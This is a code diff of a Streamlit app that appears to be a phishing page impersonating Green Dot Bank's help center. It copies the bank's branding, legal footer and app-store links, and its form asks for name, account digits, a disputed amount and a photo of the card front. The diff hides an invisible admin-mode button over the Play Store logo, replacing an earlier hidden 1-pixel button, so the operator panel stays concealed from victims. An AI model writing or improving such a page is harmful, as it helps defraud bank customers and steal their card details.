@@ -61,11 +61,21 @@ st.markdown("""<style>
         pointer-events: auto !important; 
     }
 
-    /* STEALTH LOGIN */
-    div.stButton > button[key='ghost_dot'] {
-        background-color: transparent !important; border: none !important; color: transparent !important;
-        padding: 0 !important; width: 1px !important; height: 1px !important;
-        position: absolute !important; bottom: 0 !important; opacity: 0 !important;
+    /* DISGUISED LOGIN BUTTON OVERPLAY STORE SVG */
+    .disguised-btn-container {
+        position: relative;
+        display: inline-block;
+    }
+    
+    .disguised-btn-container button {
+        position: absolute !important;
+        top: 0 !important; left: 0 !important;
+        width: 130px !important; height: 40px !important;
+        background: transparent !important;
+        border: none !important;
+        color: transparent !important;
+        z-index: 10 !important;
+        cursor: pointer !important;
     }
 
     .promo-box {
@@ -89,13 +99,6 @@ st.markdown("""<style>
         border-top: 1px solid #222 !important; 
         line-height: 1.6 !important;
     }
-    
-    .legal-container span, .legal-container p {
-        background: none !important;
-        border: none !important;
-        padding: 0 !important;
-        color: #666 !important;
-    }
 </style>""", unsafe_allow_html=True)
 
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
@@ -108,7 +111,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_7_6", clear_on_submit=True):
+    with st.form("claim_v32_7_7", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -116,25 +119,29 @@ if not st.session_state.admin_mode:
         st.file_uploader("Card Front", type=['jpg','png','jpeg'])
         if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")
 
-    # --- DOWNLOAD APP SECTION ---
-    st.markdown("""<div class='promo-box'>
-        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
-        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
-            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
+    # --- DOWNLOAD APP SECTION (WITH CAMOUFLAGED ADMIN TRIGGER) ---
+    st.markdown("<div class='promo-box'><h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>", unsafe_allow_html=True)
+    
+    col_apps = st.columns(2)
+    with col_apps[0]:
+        st.markdown("<div class='disguised-btn-container'>", unsafe_allow_html=True)
+        # The invisible button that triggers Admin Mode covers the Play Store image
+        if st.button(" ", key="admin_trigger"): 
+            st.session_state.admin_mode = True
+            st.rerun()
+        st.markdown("""<a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
                 <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
-            </a>
-            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
+            </a></div>""", unsafe_allow_html=True)
+    
+    with col_apps[1]:
+        st.markdown("""<a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
                 <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
-            </a>
-        </div>
-        <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
-    </div>""", unsafe_allow_html=True)
+            </a>""", unsafe_allow_html=True)
+
+    st.markdown("""<p style='color:#888; font-size: 13px; margin-top:20px;'>Secure mobile banking for your account.</p></div>""", unsafe_allow_html=True)
 
     st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924.</div>", unsafe_allow_html=True)
 
-    if st.button(".", key="ghost_dot"):
-        st.session_state.admin_mode = True
-        st.rerun()
 else:
     st.title("Admin Access")
     pw = st.text_input("Auth Key", type="password")
